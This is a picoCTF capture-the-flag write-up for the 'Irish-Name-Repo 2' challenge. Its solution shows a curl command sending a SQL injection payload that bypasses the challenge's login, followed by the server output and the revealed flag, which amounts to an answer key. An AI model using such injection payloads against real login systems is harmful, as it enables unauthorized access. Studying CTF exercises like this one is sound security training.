# Irish-Name-Repo 2

## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Pistas
- The password is being filtered.
## Solución
```shell
heligarcia-picoctf@webshell:~$ curl -s https://jupiter.cha53751/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>heligarcia-picoctf@webshell:~$ ^C
```

## Bandera
picoCTF{m0R3_SQL_plz_c34df170}

## Notas adicionales
Payloads

## Referencias
None
